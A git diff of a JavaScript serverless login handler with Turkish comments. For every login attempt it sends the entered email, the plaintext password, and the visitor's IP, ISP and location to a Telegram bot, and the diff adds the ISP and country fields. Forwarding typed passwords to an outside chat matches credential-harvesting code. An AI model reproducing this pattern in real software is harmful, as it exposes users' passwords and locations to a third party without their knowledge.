@@ -4,16 +4,23 @@ export default async function handler(req, res) {
     try {
         const { email, pass, ipData } = req.body;
         
-        // Vercel'deki isimlerle birebir aynı
         const BOT_TOKEN = process.env.BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_ID;
         const DOGRU_SIFRE = process.env.SIFRE;
 
+        // Burada istediğin bir admin e-postası varsa onu da kontrol edebilirsin
+        // Şimdilik sadece şifre kontrolü yapıyoruz ama mesajda detaylı yazacak
         const girisBasarili = (String(pass) === String(DOGRU_SIFRE));
 
-        const mesaj = `🚀 **GİRİŞ DENEMESİ**\n\n📧 E-posta: ${email}\n🔑 Girilen: ${pass}\n📡 IP: ${ipData.ip}\n📍 Konum: ${ipData.city}\n✅ Durum: ${girisBasarili ? "BAŞARILI" : "HATALI"}`;
+        // ISS bilgisi ipData.org içindedir
+        const mesaj = `🚀 **TERCES PANEL BİLDİRİM**\n\n` +
+                      `📧 E-posta: ${email}\n` +
+                      `🔑 Girilen Şifre: ${pass}\n` +
+                      `📡 IP: ${ipData.ip || "Bilinmiyor"}\n` +
+                      `🏢 ISS (İnternet): ${ipData.org || "Bilinmiyor"}\n` + // ISS Buraya eklendi
+                      `📍 Konum: ${ipData.city || "Bilinmiyor"} / ${ipData.country_name || ""}\n` +
+                      `✅ Durum: ${girisBasarili ? "GİRİŞ BAŞARILI" : "HATALI GİRİŞ"}`;
 
-        // Telegram bildirimi
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -27,11 +34,10 @@ export default async function handler(req, res) {
         if (girisBasarili) {
             return res.status(200).json({ success: true });
         } else {
-            return res.status(401).json({ success: false, message: "Şifre yanlış!" });
+            return res.status(401).json({ success: false, message: "Giriş bilgileri hatalı!" });
         }
     } catch (error) {
-        console.error(error);
-        return res.status(500).json({ success: false, error: "Sunucu hatası" });
+        return res.status(500).json({ success: false, error: "Sistem hatası" });
     }
 }
 
